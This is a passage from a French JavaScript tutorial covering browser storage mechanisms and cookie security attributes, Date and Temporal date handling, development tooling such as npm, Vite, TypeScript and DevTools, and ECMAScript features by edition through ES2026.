    </dialog>`;

const boite = document.querySelector('dialog');
boite.showModal();                  // modale : bloque l'arrière-plan, gère le focus et la touche Échap
console.log(boite.open);            // true
boite.addEventListener('close', () => console.log('Fermée :', boite.returnValue));
```

### 22.2 Comparer les mécanismes de stockage

|  | Cookie | `localStorage` | `sessionStorage` | IndexedDB |
| --- | --- | --- | --- | --- |
| Capacité | \~4 Ko | \~5 Mo | \~5 Mo | Très grande (centaines de Mo et plus) |
| Durée | Selon `Max-Age` / `Expires` | **Permanente** | **Onglet** (jusqu'à sa fermeture) | Permanente |
| Envoyé au serveur | Oui, à **chaque** requête | Non | Non | Non |
| API | Chaîne `document.cookie` | Synchrone, texte | Synchrone, texte | Asynchrone, objets structurés |
| Accessible par | Serveur et client | Client | Client | Client |
| Portée | Domaine + chemin | **Origine** | Origine + onglet | Origine |

L'**origine** est le triplet *protocole + domaine + port* : `http://exemple.fr` et `https://exemple.fr` ont des stockages **séparés**.

### 22.3 Les cookies

Un **cookie** est un petit morceau de texte que le serveur ou le script dépose dans le navigateur ; le navigateur le renvoie automatiquement avec chaque requête vers le domaine concerné. Ils servent surtout à l'**identification de session** et à des préférences lisibles par le serveur.

```javascript
// Écrire (chaque affectation ajoute/modifie UN seul cookie)
document.cookie = 'theme=sombre; Max-Age=31536000; Path=/; SameSite=Lax; Secure';
document.cookie = 'langue=fr; Max-Age=31536000; Path=/; SameSite=Lax; Secure';

// Lire : tous les cookies visibles, en une seule chaîne
console.log(document.cookie);       // 'theme=sombre; langue=fr'
const cookies = Object.fromEntries(document.cookie.split('; ').map(c => c.split('=')));
console.log(cookies.theme);         // 'sombre'

// Supprimer : durée de vie expirée (mêmes Path et Domain qu'à la création)
document.cookie = 'theme=; Max-Age=0; Path=/';
console.log(document.cookie);       // 'langue=fr'
// Remarque : avec Secure, le cookie n'est enregistré qu'en HTTPS (ou sur localhost).
```

| Attribut | Rôle |
| --- | --- |
| `Max-Age` / `Expires` | Durée de vie (sans eux : cookie de **session**, effacé à la fermeture) |
| `Path` / `Domain` | Portée d'envoi du cookie |
| `Secure` | Envoyé uniquement en **HTTPS** |
| `HttpOnly` | **Inaccessible à JavaScript** (posé par le serveur uniquement) : protège contre le vol par XSS |
| `SameSite` | `Strict` / `Lax` / `None` : limite l'envoi entre sites, protège contre le **CSRF** |

> **Sécurité** : les cookies de **session et d'authentification** doivent être posés par le **serveur** avec `HttpOnly; Secure; SameSite`. N'y stockez jamais de données sensibles lisibles par JavaScript. Les cookies sont envoyés à chaque requête : gardez-les petits. En Europe, les cookies non essentiels (mesure d'audience, publicité) exigent le **consentement** préalable de l'utilisateur (RGPD / ePrivacy).
>
> La **Cookie Store API** (`cookieStore.get()`, `.set()`) offre une alternative asynchrone moderne, selon la prise en charge du navigateur.

### 22.4 `localStorage`

Stockage **persistant** (survit à la fermeture du navigateur), propre à l'**origine**, ne contenant que des **chaînes** de caractères (clés et valeurs).

```javascript
localStorage.setItem('theme', 'sombre');
console.log(localStorage.getItem('theme'));          // 'sombre' (null si absent)
localStorage.removeItem('theme');
console.log(localStorage.getItem('theme'));          // null

// Objets et tableaux : sérialiser en JSON
localStorage.setItem('panier', JSON.stringify([{ id: 1, qte: 2 }]));
const panier = JSON.parse(localStorage.getItem('panier') ?? '[]');
console.log(panier);                                 // [{ id: 1, qte: 2 }]
console.log(localStorage.length, localStorage.key(0));

// Réagir aux modifications faites dans un AUTRE onglet (l'événement ne se déclenche pas dans l'onglet qui écrit)
window.addEventListener('storage', e => console.log(e.key, e.oldValue, e.newValue));

localStorage.clear();                                // efface TOUT le stockage de ce site
console.log(localStorage.length);                    // 0
```

**Limites** : environ 5 Mo ; **synchrone** (bloque le fil principal) ; texte uniquement (`localStorage.setItem('n', 42)` stocke `'42'`) ; **lisible et modifiable par tout script de la page** (donc vulnérable à une faille XSS) ; indisponible ou limité dans certains modes de navigation privée ; lève `QuotaExceededError` si le quota est dépassé.

**Usages** : thème, préférences d'affichage, brouillons, petit cache. **Ne stockez jamais** de mots de passe, de jetons d'authentification sensibles ou de données personnelles.

```javascript
// Lecture robuste : JSON absent, corrompu ou stockage indisponible
function lireStockage(cle, defaut) {
    try { return JSON.parse(localStorage.getItem(cle)) ?? defaut; }
    catch { return defaut; }
}
function ecrireStockage(cle, valeur) {
    try { localStorage.setItem(cle, JSON.stringify(valeur)); return true; }
    catch (e) { console.error('Écriture impossible :', e.name); return false; }   // quota dépassé, mode privé
}

ecrireStockage('prefs', { theme: 'sombre' });
console.log(lireStockage('prefs', {}));              // { theme: 'sombre' }
console.log(lireStockage('absent', []));             // [] : valeur par défaut
localStorage.setItem('casse', '{ pas du JSON');
console.log(lireStockage('casse', 'défaut'));        // 'défaut' : JSON invalide
```

Pensez au **versionnement** du format stocké (`{ version: 2, ... }`) pour migrer proprement les données des anciens visiteurs, et préfixez vos clés (`monapp:prefs`) pour éviter les collisions.

### 22.5 `sessionStorage`

Même API que `localStorage`, mais les données sont **propres à l'onglet** (plus précisément au contexte de navigation) et **supprimées à sa fermeture** ; elles sont **conservées lors d'un rechargement** de la page.

```javascript
sessionStorage.setItem('etape', '2');
console.log(sessionStorage.getItem('etape'));        // '2'
sessionStorage.clear();
console.log(sessionStorage.getItem('etape'));        // null
```

Usages : état d'un formulaire multi-étapes, filtres temporaires, données liées à une session d'onglet. Deux onglets du même site ont des `sessionStorage` **distincts**.

### 22.6 Pour aller plus loin

- **IndexedDB** : base de données objet, asynchrone, transactionnelle, pour de gros volumes, des fichiers ou des index ; on l'utilise rarement brute : bibliothèques **`idb`** ou **Dexie**.
- **Cache API** et **Service Workers** : mise en cache des requêtes et fonctionnement **hors-ligne** (applications web progressives, PWA).
- **Origin Private File System** : fichiers privés à l'origine, performants, pour des besoins avancés.
- **`navigator.storage.estimate()`** et **`navigator.storage.persist()`** : connaître le quota et demander un stockage non purgeable.
- Les données stockées côté client peuvent être **effacées** par l'utilisateur ou le navigateur : considérez-les comme un **cache**, jamais comme la source de vérité.

### 22.7 Choisir le bon stockage

| Besoin | Choix |
| --- | --- |
| Session d'authentification | Cookie `HttpOnly; Secure; SameSite` posé par le serveur |
| Préférence d'interface persistante | `localStorage` |
| État temporaire d'un onglet | `sessionStorage` |
| Gros volumes, données structurées, hors-ligne | IndexedDB |
| Données à garder en mémoire pendant la visite seulement | Variable JavaScript |

### Points clés du module 22

- Le BOM (`window`, `navigator`, `location`, `history`, `screen`) pilote le navigateur ; le DOM représente la page.
- `history.pushState` + `popstate` fondent le routage des applications monopages.
- Cookies (envoyés au serveur), `localStorage` (persistant), `sessionStorage` (par onglet), IndexedDB (volumineux).
- Aucun secret dans `localStorage` ; sessions via cookies `HttpOnly` côté serveur.

## 23. Dates et heures : `Date` et `Temporal`

### 23.1 L'objet `Date` (historique)

Un objet **`Date`** représente un **instant** sous la forme d'un **nombre de millisecondes** écoulées depuis l'**epoch Unix** (1ᵉʳ janvier 1970 à 00:00:00 UTC). Il propose deux « vues » du même instant : **UTC** et **heure locale** (fuseau du système).

```javascript
const maintenant = new Date();                       // instant présent
console.log(new Date('2026-10-11T14:30:00Z'));       // chaîne ISO 8601 (fiable) ; 'Z' = UTC
console.log(new Date(2026, 9, 11).getMonth());       // 9 : les mois vont de 0 à 11, donc 9 = octobre
console.log(new Date(0));                            // timestamp en ms (epoch 1970)
console.log(Date.now());                             // timestamp actuel en ms (sans créer d'objet)
console.log(Date.UTC(2026, 9, 11));                  // timestamp d'une date UTC
```

> **Piège** : `new Date('2026-10-11')` (date seule) est interprétée en **UTC**, mais `new Date('2026-10-11T00:00')` (avec heure, sans `Z`) en **heure locale**. L'analyse d'autres formats (`'11/10/2026'`, `'Oct 11, 2026'`) **dépend de l'implémentation** : n'analysez que de l'ISO 8601.

#### Lire

| Méthode | Renvoie |
| --- | --- |
| `getFullYear()` | Année sur 4 chiffres |
| `getMonth()` | Mois **0–11** |
| `getDate()` | Jour du mois 1–31 |
| `getDay()` | Jour de la semaine 0 (dimanche) à 6 (samedi) |
| `getHours()` `getMinutes()` `getSeconds()` `getMilliseconds()` | Heure locale |
| `getTime()` / `valueOf()` | Timestamp en millisecondes |
| `getTimezoneOffset()` | Décalage local par rapport à UTC, **en minutes** (signe inversé : Paris en hiver renvoie `-60`) |
| `getUTC…()` | Équivalents en UTC |

#### Modifier (mutent l'objet)

`setFullYear()`, `setMonth()`, `setDate()`, `setHours()`, `setMinutes()`, `setSeconds()`, `setTime()` et leurs variantes `setUTC…` **modifient** l'objet existant.

```javascript
const d = new Date(2026, 0, 31);             // 31 janvier 2026
d.setMonth(d.getMonth() + 1);                // débordement : le 31 février n'existe pas
console.log(d.toLocaleDateString('fr-FR'));  // '03/03/2026' : on obtient le 3 mars, pas le 28 février

const demain = new Date();
demain.setDate(demain.getDate() + 1);        // ajouter un jour : le débordement est géré (fin de mois)

const copie = new Date(d);                   // copier AVANT de modifier : Date est mutable et passée par référence
```

#### Formater

```javascript
const d = new Date('2026-10-11T14:30:00Z');

console.log(d.toISOString());                                         // '2026-10-11T14:30:00.000Z' (format d'échange)
console.log(d.toJSON());                                              // idem, utilisé par JSON.stringify
console.log(d.toLocaleDateString('fr-FR', { dateStyle: 'full', timeZone: 'UTC' }));   // 'dimanche 11 octobre 2026'
console.log(d.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit', timeZone: 'UTC' }));   // '14:30'
console.log(new Intl.DateTimeFormat('fr-FR', { dateStyle: 'long', timeStyle: 'short', timeZone: 'Indian/Antananarivo' }).format(d));
// '11 octobre 2026 à 17:30'
console.log(new Intl.RelativeTimeFormat('fr', { numeric: 'auto' }).format(-1, 'day'));   // 'hier'
console.log(new Intl.ListFormat('fr', { type: 'conjunction' }).format(['lundi', 'mardi', 'mercredi']));   // 'lundi, mardi et mercredi'
```

`Intl.DateTimeFormat` gère langue, calendrier, fuseau (`timeZone`), styles (`dateStyle`, `timeStyle`) et composants (`weekday`, `month`, `hour12`…). Créez le formateur **une fois** et réutilisez-le.

#### Différence entre deux dates

```javascript
const date1 = new Date(2026, 2, 1);
const date2 = new Date(2026, 2, 31);

const jours = Math.round((date2 - date1) / 86_400_000);   // soustraction = différence en ms ; 86 400 000 ms = 1 jour
console.log(jours);                                       // 30
```

**Attention** : cette méthode suppose des jours de 24 h ; elle se trompe d'une heure lors des **changements d'heure** (été/hiver), d'où l'arrondi. Pour des calculs calendaires exacts, utilisez `Temporal`.

#### Défauts de `Date`

- Mois indexés à partir de **0**, jours de semaine à partir de dimanche.
- Objet **mutable** (effets de bord).
- **Analyse de chaînes** incohérente selon les navigateurs.
- **Fuseaux horaires** : seulement « local » ou « UTC » ; impossible de travailler dans un fuseau arbitraire sans `Intl`.
- Pas de **calendriers** non grégoriens, pas de durées, arithmétique source d'erreurs, précision limitée à la milliseconde.
- Pas de type « date seule » ou « heure seule » : une date sans heure est modélisée par un instant à minuit, ce qui provoque des décalages de jour selon le fuseau.

### 23.2 `Temporal` : le remplaçant moderne

**`Temporal`** est une API conçue pour remplacer `Date`. Ses objets sont **immuables** (chaque opération renvoie un nouvel objet), les mois vont de **1 à 12**, les **fuseaux horaires IANA** sont gérés pour de bon (`Europe/Paris`, `Indian/Antananarivo`), les **calendriers** multiples sont pris en charge, l'arithmétique est fiable (gestion des changements d'heure), et la précision atteint la **nanoseconde**. Il distingue clairement les concepts.

> **Statut (octobre 2026)** : `Temporal` a atteint le **stade 4** de TC39 en 2026 ; sa publication officielle est prévue dans **ES2027** (ES2026 ne l'inclut pas). Il est déjà disponible dans **Firefox 139+** et **Chrome / Edge 144+** ; la prise en charge de **Safari** peut varier : vérifiez sur caniuse.com. Un *polyfill* existe (`@js-temporal/polyfill`).

| Type | Représente | Exemple |
| --- | --- | --- |
| `Temporal.Instant` | Un **instant précis** de la ligne du temps (sans fuseau ni calendrier) | `Temporal.Now.instant()` |
| `Temporal.ZonedDateTime` | Date + heure + **fuseau** (instant « vu » depuis un lieu) | `Temporal.Now.zonedDateTimeISO()` |
| `Temporal.PlainDate` | Une **date calendaire** sans heure ni fuseau | `2026-10-11` |
| `Temporal.PlainTime` | Une **heure** sans date ni fuseau | `14:30` |
| `Temporal.PlainDateTime` | Date + heure **sans fuseau** (heure « murale ») | `2026-10-11T14:30` |
| `Temporal.PlainYearMonth` / `PlainMonthDay` | Mois d'une année / jour récurrent (anniversaire) | `2026-10` / `10-11` |
| `Temporal.Duration` | Une **durée** | `{ days: 3, hours: 2 }` |

**Choisir le bon type** : un anniversaire ou une échéance → `PlainDate` ; un rendez-vous à un endroit donné → `ZonedDateTime` ; un horodatage technique (journal, base de données) → `Instant` ; une durée → `Duration`.

```javascript
const aujourdHui = Temporal.Now.plainDateISO();            // ex. 2026-10-21
const noel = Temporal.PlainDate.from('2026-12-25');

console.log(aujourdHui.until(noel).days);                  // jours restants (objet Duration)
console.log(aujourdHui.add({ months: 1 }).toString());     // un mois plus tard : NOUVEL objet (immuable)
console.log(aujourdHui.dayOfWeek);                         // 1 (lundi) à 7 (dimanche)
console.log(aujourdHui.daysInMonth, aujourdHui.inLeapYear);

const fin = Temporal.PlainDate.from('2026-01-31').add({ months: 1 });
console.log(fin.toString());                               // '2026-02-28' : le jour est ajusté au dernier jour valide

const reunion = Temporal.ZonedDateTime.from('2026-10-11T14:30[Indian/Antananarivo]');
console.log(reunion.withTimeZone('Europe/Paris').toString());   // même instant, vu depuis Paris
console.log(reunion.toLocaleString('fr-FR', { dateStyle: 'full', timeStyle: 'short' }));

const a = Temporal.PlainDate.from('2026-01-01');
const b = Temporal.PlainDate.from('2026-06-01');
console.log(Temporal.PlainDate.compare(a, b));             // -1, 0 ou 1 : utilisable avec sort()
console.log(a.until(b, { largestUnit: 'month' }).toString());   // 'P5M'

const duree = Temporal.Duration.from({ hours: 1, minutes: 90 });
console.log(duree.round({ largestUnit: 'hour' }).toString());    // 'PT2H30M'
```

Points précis : les chaînes sont au format **ISO 8601** (avec annotations `[fuseau]` et `[u-ca=calendrier]`) ; `from()` est **strict** (il refuse une date invalide au lieu de la « déborder » comme `Date`, sauf option `overflow: 'constrain'`) ; les comparaisons utilisent `compare()` et `equals()`, pas `===` ; `Temporal` ne se convertit pas implicitement en nombre (`valueOf` lève une erreur), pour éviter les confusions.

#### `Date` → `Temporal`

```javascript
const instant = new Date().toTemporalInstant();            // passerelle depuis Date (si disponible)
console.log(instant.toString());
console.log(instant.toZonedDateTimeISO('Europe/Paris').toString());
const enMs = Temporal.Instant.fromEpochMilliseconds(Date.now());
```

### 23.3 Bonnes pratiques

- Pour un nouveau projet : utilisez **`Temporal`** (ou, en attendant, **date-fns**, **Luxon** ou **Day.js**, ou le polyfill).
- **Stockez et échangez** les dates en **ISO 8601 / UTC** (`toISOString()`, `Instant`), et ne convertissez en heure **locale** qu'à l'**affichage** (`Intl.DateTimeFormat`).
- Ne construisez pas de dates à partir de chaînes non ISO.
- Pour les dates sans heure (anniversaires, échéances), évitez l'objet `Date` : utilisez `Temporal.PlainDate` ou des chaînes `AAAA-MM-JJ`.
- Ne calculez jamais « + 24 h » pour obtenir « demain » : les changements d'heure rendent certains jours plus courts ou plus longs.
- Testez vos fonctions de dates avec des cas limites : fin de mois, 29 février, changement d'heure, fuseaux éloignés.

### Points clés du module 23

- `Date` est un timestamp en millisecondes ; mois indexés à 0, mutable, analyse non fiable hors ISO 8601.
- `Intl.DateTimeFormat` et `Intl.RelativeTimeFormat` formatent selon la langue et le fuseau.
- `Temporal` (stade 4, ES2027) : immuable, vrais fuseaux, types distincts (`Instant`, `ZonedDateTime`, `PlainDate`, `Duration`).
- Stockez en UTC / ISO 8601 ; localisez à l'affichage.

## 24. Outils et écosystème

### 24.1 Node.js et gestionnaires de paquets

**Node.js** est un environnement d'exécution JavaScript hors navigateur, construit sur le moteur V8. Il sert à exécuter des scripts, des serveurs, des outils de build et des tests. Utilisez une version **LTS** (*Long Term Support*, maintenue sur le long terme), par exemple Node.js 24, pour vos projets de production. Un gestionnaire de versions (**nvm**, **fnm**, **Volta**) permet d'en installer plusieurs.

Un **paquet** est un ensemble de code publié, décrit par un fichier `package.json`. Le gestionnaire de paquets (**npm**, fourni avec Node.js) installe les paquets et leurs dépendances dans `node_modules/` et enregistre les versions exactes dans un **fichier de verrouillage** (`package-lock.json`) pour garantir des installations reproductibles.

```bash
node --version              # utilisez une version LTS
npm init -y                 # crée package.json
npm install lodash          # ajoute une dépendance d'exécution
npm install -D vitest       # dépendance de développement (tests, outils)
npm run build               # exécute un script défini dans package.json
npx vite                    # exécute un outil sans l'installer globalement
npm outdated                # liste les paquets à mettre à jour
npm audit                   # recherche des vulnérabilités connues
```

```json
{
  "name": "mon-projet",
  "version": "1.0.0",
  "type": "module",
  "scripts": { "dev": "vite", "build": "vite build", "test": "vitest" },
  "dependencies": { "lodash": "^4.17.21" },
  "devDependencies": { "vitest": "^3.0.0" }
}
```

**Versionnement sémantique** (*semver*) : `MAJEUR.MINEUR.CORRECTIF`. `^4.17.21` accepte les mises à jour mineures et correctifs (4.x.x) ; `~4.17.21` seulement les correctifs ; une version exacte les interdit toutes. Un changement **majeur** peut casser la compatibilité.

Alternatives à npm : **pnpm** (économe en disque), **Yarn**, **Bun** (runtime + gestionnaire). Versionnez `package.json` et le fichier de verrouillage (`package-lock.json`, `pnpm-lock.yaml`), **jamais** `node_modules/` (ajoutez-le à `.gitignore`).

**Sécurité de la chaîne d'approvisionnement** : chaque dépendance est du code que vous exécutez. Limitez leur nombre, vérifiez la réputation et la maintenance d'un paquet avant de l'ajouter, lancez `npm audit`, épinglez les versions via le fichier de verrouillage, et méfiez-vous des noms trompeurs (*typosquatting*) et des scripts d'installation.

### 24.2 Outils de qualité et de build

| Besoin | Outils | Rôle |
| --- | --- | --- |
| **Serveur de développement et bundler** | **Vite**, esbuild, Rollup, webpack | Servir le code en développement (rechargement à chaud) ; regrouper, minifier et optimiser pour la production |
| **Lint** (analyse statique) | **ESLint**, Biome, oxlint | Détecter bogues probables et mauvaises pratiques |
| **Formatage** | **Prettier**, Biome | Style de code uniforme et automatique |
| **Tests** | **Vitest**, Jest, `node:test` (intégré à Node), Playwright / Cypress (bout en bout) | Vérifier le comportement |
| **Typage** | **TypeScript** | Vérification des types avant exécution |
| **Transpilation** | Babel, SWC | Convertir du code récent pour d'anciens navigateurs |
| **Intégration continue** | GitHub Actions, GitLab CI | Exécuter lint et tests à chaque modification |

**Bundler** : outil qui assemble les modules et leurs dépendances en quelques fichiers optimisés (minification, *tree-shaking*, découpage de code). **Transpileur** : convertit une syntaxe récente vers une syntaxe plus ancienne selon les navigateurs ciblés (liste *browserslist*). **Polyfill** : code qui ajoute une API manquante.

#### Écrire un test

```javascript
// somme.test.js (exécuté par : node --test, ou vitest)
import { test } from 'node:test';
import assert from 'node:assert/strict';

const somme = (a, b) => a + b;

test('additionne deux nombres', () => {
    assert.equal(somme(2, 3), 5);
});

test('gère les décimaux avec tolérance', () => {
    assert.ok(Math.abs(somme(0.1, 0.2) - 0.3) < Number.EPSILON);
});
```

Un bon test est **court**, **indépendant**, **déterministe** et décrit un comportement, non une implémentation. Visez d'abord les fonctions pures (faciles à tester), puis isolez les effets de bord.

### 24.3 TypeScript

**TypeScript** est un sur-ensemble de JavaScript qui ajoute un **système de types statique**, vérifié **avant** l'exécution (à la compilation ou dans l'éditeur). Tout JavaScript valide est du TypeScript valide. Les types sont **effacés** à l'exécution : le résultat est du JavaScript ordinaire. Les versions récentes de Node.js savent exécuter directement des fichiers `.ts` simples (simple suppression des annotations de types, sans vérification).

```typescript
function additionner(a: number, b: number): number {
    return a + b;
}
console.log(additionner(2, 3));      // 5
// additionner('2', 3);              // erreur détectée AVANT l'exécution

type Utilisateur = { id: number; nom: string; email?: string };   // email est facultatif
interface Forme { aire(): number }

const u: Utilisateur = { id: 1, nom: 'Alice' };
const ids: number[] = [1, 2, 3];
const resultat: Promise<Utilisateur> = Promise.resolve(u);

function premier<T>(tableau: T[]): T | undefined {       // générique : fonctionne pour tout type T
    return tableau[0];
}
console.log(premier(ids));                               // le compilateur déduit T = number
```

Apports : détection d'erreurs précoce, autocomplétion fiable, documentation vivante, refactorisation sûre. On peut aussi vérifier du JavaScript pur grâce aux annotations **JSDoc** et à `// @ts-check`. Les configurations se font dans `tsconfig.json` (activez `"strict": true`).

### 24.4 Frameworks et bibliothèques courants

| Domaine | Exemples | À quoi ça sert |
| --- | --- | --- |
| Interfaces utilisateur | React, Vue, Svelte, Angular, Solid | Construire des interfaces à partir de **composants** et d'un état réactif |
| Méta-frameworks | Next.js, Nuxt, SvelteKit, Astro, Remix | Routage, rendu côté serveur, génération statique, déploiement |
| Serveur | Express, Fastify, Hono, NestJS | API HTTP, services |
| Composants natifs | Web Components, Lit | Composants standards, sans dépendre d'un framework |
| Utilitaires | date-fns, Luxon, Zod, Lodash | Dates, validation de données, fonctions utilitaires |
| Données serveur | TanStack Query, SWR | Récupération, cache et synchronisation des données |

Choisir : commencez par maîtriser le **JavaScript pur** et les API web ; adoptez un framework quand la complexité de l'interface (état partagé, nombreux composants) le justifie, selon l'écosystème de votre équipe.

### 24.5 Débogage

```javascript
const x = 5;
const tableau = [{ a: 1 }, { a: 2 }];
const objet = { nom: 'Alice', details: { ville: 'Paris' } };

console.log(x);
console.table(tableau);                                 // tableau lisible
console.dir(objet, { depth: null });                    // inspection complète d'un objet imbriqué
console.group('Groupe'); console.log('indenté'); console.groupEnd();

console.time('calcul');
let somme = 0;
for (let i = 0; i < 1_000_000; i++) somme += i;
console.timeEnd('calcul');                              // durée écoulée

console.assert(x > 0, 'x doit être positif');           // condition vraie : rien n'est affiché
console.assert(x < 0, 'x doit être négatif');           // condition fausse : affiche « Assertion failed »
console.trace('Pile d\'appels');                         // affiche la pile d'appels
debugger;                                               // point d'arrêt (sans effet si les DevTools sont fermés)
```

Les **DevTools** du navigateur (F12) :

- **Console** : messages, évaluation de code, erreurs.
- **Sources** : lecture du code, **points d'arrêt** (conditionnels, sur événements), exécution pas à pas (*step over / into / out*), inspection de la pile d'appels et des variables, *watch expressions*.
- **Network** : requêtes, en-têtes, délais, statuts, simulation de connexion lente.
- **Application** : cookies, `localStorage`, IndexedDB, Service Workers, cache.
- **Performance** et **Memory** : profil d'exécution, détection de fuites mémoire.
- **Elements** : inspection et modification du DOM et du CSS en direct.

**Méthode de débogage** : 1) **reproduire** le problème de façon fiable ; 2) **isoler** (réduire le code, bissection) ; 3) **formuler une hypothèse** ; 4) **vérifier** avec un point d'arrêt ou un `console.log` ciblé ; 5) **corriger**, puis écrire un **test** qui empêche la régression. Lisez le message d'erreur et la **pile d'appels** : la première ligne de votre propre code est généralement le point de départ.

### 24.6 Bonnes pratiques de projet

- Utilisez **Git** et des commits petits et descriptifs.
- Automatisez lint, formatage et tests (hooks, intégration continue).
- Écrivez un `README` : installation, lancement, tests, déploiement.
- Gérez la **configuration** et les secrets par variables d'environnement, jamais dans le code versionné.
- Mesurez avant d'optimiser (profil de performance) ; surveillez le poids des bundles.
- Mettez régulièrement les dépendances à jour, par petites étapes.

### Points clés du module 24

- Node.js exécute JavaScript hors navigateur ; npm gère les paquets, `package.json` les décrit, le fichier de verrouillage les fige.
- Vite/esbuild (build), ESLint/Prettier (qualité), Vitest/`node:test` (tests), TypeScript (types).
- Les DevTools (Console, Sources, Network, Application) sont l'outil de débogage essentiel.
- Maîtrisez le langage avant les frameworks ; auditez vos dépendances.

## 25. Nouveautés par version d'ECMAScript

### 25.1 Le processus et la cadence

Depuis ES2015, une nouvelle **édition annuelle** de la norme ECMA-262 est publiée (approuvée vers juin par l'assemblée générale d'Ecma). Chaque fonctionnalité naît comme **proposition** TC39 et franchit les stades 0 à 4 ; une proposition au **stade 4** est incluse dans l'édition de l'année suivante. Les moteurs implémentent souvent une fonctionnalité **avant** sa publication officielle (au stade 3) : la **compatibilité effective** se vérifie donc dans les tableaux de MDN et caniuse.com.

| Stade | Signification |
| --- | --- |
| 0 | Idée |
| 1 | Proposition étudiée |
| 2 | Brouillon de spécification |
| 2.7 | Spécification complète, en revue |
| 3 | Candidate : implémentations et retours attendus |
| 4 | Terminée : sera intégrée à la prochaine édition |

### 25.2 Tableau récapitulatif

| Édition | Année | Fonctionnalités marquantes |
| --- | --- | --- |
| **ES2015** (ES6) | 2015 | `let` / `const`, fonctions fléchées, classes, modules, promesses, gabarits, décomposition, `Map` / `Set`, générateurs, `Symbol`, paramètres par défaut et rest, spread, itérateurs, `Proxy` / `Reflect` |
| **ES2016-2017** | 2016-17 | `**`, `Array.prototype.includes()`, `async` / `await`, `Object.entries()` / `values()`, `padStart()` / `padEnd()`, `Object.getOwnPropertyDescriptors` |
| **ES2018-2019** | 2018-19 | Spread / rest d'objets, `Promise.prototype.finally()`, `for await...of`, regex (groupes nommés, rétrospection, `s`, `\p{}`), `flat()` / `flatMap()`, `Object.fromEntries()`, `catch` sans liaison |
| **ES2020** | 2020 | `?.`, `??`, `BigInt`, `globalThis`, `import()` dynamique, `String.prototype.matchAll()`, `Promise.allSettled()`, `import.meta` |
| **ES2021** | 2021 | `replaceAll()`, `??=` / `\|\|=` / `&&=`, `Promise.any()`, séparateurs numériques `1_000`, `WeakRef` |
| **ES2022** | 2022 | Champs et méthodes **privés `#`**, blocs `static`, `at()`, `Object.hasOwn()`, `await` de haut niveau, `Error.cause`, flag regex `d` |
| **ES2023** | 2023 | `toSorted()`, `toReversed()`, `toSpliced()`, `with()`, `findLast()` / `findLastIndex()`, `#!` (hashbang) |
| **ES2024** | 2024 | `Object.groupBy()` / `Map.groupBy()`, `Promise.withResolvers()`, flag regex `v`, `isWellFormed()` / `toWellFormed()`, `Atomics.waitAsync`, `ArrayBuffer` redimensionnable |
| **ES2025** | 2025 | Assistants d'itérateurs, méthodes de `Set` (`union`…), `Promise.try()`, `RegExp.escape()`, `Float16Array`, import de JSON (`with { type: 'json' }`), modificateurs et groupes nommés dupliqués en regex |
| **ES2026** | 2026 *(approuvée le 30 juin 2026)* | `Array.fromAsync()`, `Error.isError()`, `Math.sumPrecise()`, méthodes base64 / hexadécimales de `Uint8Array`, `Iterator.concat()`, accès au texte source dans `JSON.parse`, `Map` / `WeakMap` `getOrInsert()` |
| **ES2027** *(en préparation)* | 2027 | `Temporal`, gestion explicite des ressources (`using`), etc. : déjà au stade 4 |

### 25.3 Lecture commentée par édition

#### ES2015 : la refondation

Cette édition a changé la façon d'écrire du JavaScript : **portée de bloc** (`let`, `const`), **fonctions fléchées** avec `this` lexical, **classes** et **modules**, **promesses** pour l'asynchrone, **gabarits** de chaînes, **décomposition**, **spread/rest**, paramètres par défaut, **itérateurs et générateurs**, `Map`, `Set`, `WeakMap`, `WeakSet`, `Symbol`, et métaprogrammation (`Proxy`, `Reflect`). Elle structure les modules 2, 5, 8, 9, 12, 13, 16, 18, 19 et 20.

#### ES2016 à ES2019 : confort d'écriture

`includes` (recherche lisible, gère `NaN`), `**`, **`async` / `await`** (module 16), `Object.entries` / `values` / `fromEntries`, `padStart`, spread d'objets (`{ ...a, ...b }`), `finally`, **itération asynchrone**, regex plus expressives (groupes nommés, rétrospection, propriétés Unicode), `flat` / `flatMap`, `catch` sans paramètre.

#### ES2020 : sécurité d'accès et grands nombres

`?.` et `??` simplifient la gestion des valeurs absentes ; `BigInt` dépasse la limite 2⁵³ ; `globalThis` unifie l'objet global ; `import()` permet le chargement dynamique ; `Promise.allSettled` attend toutes les promesses sans rejet global.

#### ES2021 : petits ajouts utiles

`replaceAll`, affectations logiques (`||=`, `&&=`, `??=`), `Promise.any`, séparateurs numériques, `WeakRef`.

#### ES2022 : classes complètes

**Champs et méthodes privés `#`**, champs publics et statiques, blocs d'initialisation `static`, test de marque privée (`#x in obj`), **`await` de haut niveau** dans les modules, `Array.prototype.at()`, `Object.hasOwn()`, **`Error.cause`**, flag regex `d` (indices).

#### ES2023 : tableaux non mutants

`toSorted`, `toReversed`, `toSpliced`, `with` : versions **sans mutation** de `sort`, `reverse`, `splice` et de l'affectation par indice ; `findLast` et `findLastIndex` ; ligne de *hashbang* (`#!/usr/bin/env node`) officiellement admise.

```javascript
const original = [3, 1, 2];
const trie = original.toSorted((a, b) => a - b);
console.log(original, trie);   // [3, 1, 2] [1, 2, 3]
```

#### ES2024 : regroupement et promesses extérieures

`Object.groupBy` et `Map.groupBy` regroupent des éléments selon une clé ; `Promise.withResolvers` expose `resolve` / `reject` à l'extérieur du constructeur ; le flag **`v`** (regex) ajoute opérations sur classes et propriétés de chaînes ; `isWellFormed` / `toWellFormed` valident et réparent l'Unicode ; `ArrayBuffer` redimensionnable et transférable.

#### ES2025 : itérateurs, ensembles et regex

**Assistants d'itérateurs** (`map`, `filter`, `take`, `drop`, `flatMap`, `reduce`, `toArray`, `Iterator.from`) ; **méthodes ensemblistes de `Set`** (`union`, `intersection`, `difference`, `symmetricDifference`, `isSubsetOf`, `isSupersetOf`, `isDisjointFrom`) ; `Promise.try` ; `RegExp.escape` ; modificateurs de regex (activer un flag sur une partie du motif) et groupes nommés dupliqués ; `Float16Array` et `Math.f16round` ; **import de JSON** avec attributs d'import.

```javascript
console.log(Promise.try(() => JSON.parse('{"a":1}')) instanceof Promise);   // true : unifie erreurs synchrones et asynchrones
```

#### ES2026 : approuvée le 30 juin 2026

- **`Array.fromAsync()`** : `Array.from` pour itérables asynchrones (module 8).
- **`Error.isError()`** : test fiable d'erreur, y compris entre contextes (module 15).
- **`Math.sumPrecise()`** : somme de nombres sans accumulation d'erreur d'arrondi (module 6).
- **Base64 et hexadécimal pour `Uint8Array`** : `toBase64()`, `fromBase64()`, `toHex()`, `fromHex()`.
- **`Iterator.concat()`** : concaténer des itérables paresseusement (module 13).
- **`JSON.parse` avec accès au texte source** et `JSON.rawJSON()` : grands entiers sans perte (module 17).
